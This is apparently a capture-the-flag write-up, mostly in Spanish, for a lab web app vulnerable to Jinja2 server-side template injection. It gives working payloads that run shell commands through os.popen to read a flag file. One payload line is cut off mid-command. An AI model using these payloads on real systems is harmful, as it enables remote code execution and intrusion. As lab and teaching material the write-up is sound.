## Descripcion
I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps! Check out my website [here](http://chatelaine.cylabacademy.net:28678/)!
## Solucion
Entra en:

```
http://chatelaine.cylabacademy.net:28678/
```

Busca el formulario donde puedes escribir el anuncio.

### 2. Comprueba si existe SSTI

En el campo del anuncio prueba:

```
{{7*7}}
```

Si la página devuelve:

```
49
```

tenemos una SSTI.

Esto normalmente indica un motor como **Jinja2**, muy común en aplicaciones Flask.

### 3. Comprueba acceso a objetos de Python

Prueba:

```
{{config}}
```

Si devuelve información de configuración de Flask, podemos continuar.

En el campo del anuncio introduce exactamente:

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

Si funciona, deberías obtener algo parecido a:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Después prueba:

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('find / -name "fl
```

En el campo del anuncio introduce:

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /challenge/flag').read() }}
```

y saldra la bandera
## Notas adicionales

## Referencias

